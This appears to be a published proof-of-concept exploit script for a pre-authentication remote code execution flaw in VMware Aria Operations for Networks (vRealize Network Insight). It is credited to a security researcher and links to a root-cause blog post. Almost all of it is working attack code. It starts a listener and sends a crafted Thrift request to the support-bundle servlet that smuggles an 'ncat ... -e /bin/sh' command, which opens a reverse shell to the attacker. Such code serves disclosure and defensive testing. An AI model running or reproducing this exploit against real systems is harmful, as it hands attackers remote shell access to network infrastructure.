"""
VMWare Aria Operations for Networks (vRealize Network Insight) pre-authenticated RCE
Version: 6.8.0.1666364233
Exploit By: Sina Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam)
A root cause analysis of the vulnerability can be found on my blog:
https://summoning.team/blog/vmware-vrealize-network-insight-rce-cve-2023-20887/
"""
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import requests
from threading import Thread
import argparse
from telnetlib import Telnet
import socket
requests.packages.urllib3.disable_warnings()



argparser = argparse.ArgumentParser()
argparser.add_argument("--url", help="VRNI URL", required=True)
argparser.add_argument("--attacker", help="Attacker listening IP:PORT (example: 192.168.1.10:1337)", required=True)

args = argparser.parse_args()




def handler():
    print("(*) Starting handler")
    t = Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((args.attacker.split(":")[0],int(args.attacker.split(":")[1])))
    s.listen(1)
    conn, addr= s.accept()
    print(f"(+) Received connection from {addr[0]}")
    t.sock = conn
    print("(+) pop thy shell! (it's ready)")
    t.interact()

def start_handler():
    t = Thread(target=handler)
    t.daemon = True
    t.start()


def exploit():
    url = args.url + "/saas./resttosaasservlet"
    revshell = f'ncat {args.attacker.split(":")[0]} {args.attacker.split(":")[1]} -e /bin/sh'
    payload = """[1,"createSupportBundle",1,0,{"1":{"str":"1111"},"2":{"str":"`"""+revshell+"""`"},"3":{"str":"value3"},"4":{"lst":["str",2,"AAAA","BBBB"]}}]"""
    result = requests.post(url, headers={"Content-Type":"application/x-thrift"}, verify=False, data=payload)

print("VMWare Aria Operations for Networks (vRealize Network Insight) pre-authenticated RCE || Sina Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam)")
start_handler()
exploit()

try:
    while True:
        pass
except KeyboardInterrupt:
    print("(*) Exiting...")
    exit(0)